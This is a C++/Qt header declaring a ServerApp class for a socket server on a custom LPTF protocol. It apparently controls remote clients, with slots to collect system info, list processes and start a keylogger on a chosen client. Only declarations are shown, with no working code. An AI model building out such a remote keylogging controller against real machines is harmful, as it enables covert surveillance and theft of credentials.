#ifndef SERVERAPP_HPP
#define SERVERAPP_HPP

#include "../utils/EnvLoader.hpp"
#include "../utils/LPTF/LPTF_Socket.hpp"
#include "../utils/LPTF/LPTF_Packet.hpp"

#include <vector>
#include <memory>
#include <string>
#include <iostream>
#include <cstring>
#include <QString>
#include <QObject>
#include <QDebug>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/select.h>
#endif

class ServerApp : public QObject
{
    Q_OBJECT
public:
    explicit ServerApp(const std::string &envFilePath);
    ~ServerApp();

    void run();

signals:
    void clientConnected(const QString& clientInfo, uint32_t sessionId);
    void clientResponse(const QString& clientInfo, const QString& text);

public slots:
    void onGetInfoSys(const QString& clientId);
    void onStartKeylogger(const QString& clientId);
    void onRequestProcessList(const QString& clientId, bool namesOnly);
    void sendToClient(const QString& clientInfo, const QByteArray& data);

private:
    void sendToClientInternal(const QString& clientId, const QByteArray& data);

    LPTF_Socket m_serverSocket;
    std::vector<std::unique_ptr<LPTF_Socket>> m_clients;
    std::vector<std::string> m_clientUsers;
    std::string m_envFilePath;
};

#endif // SERVERAPP_HPP
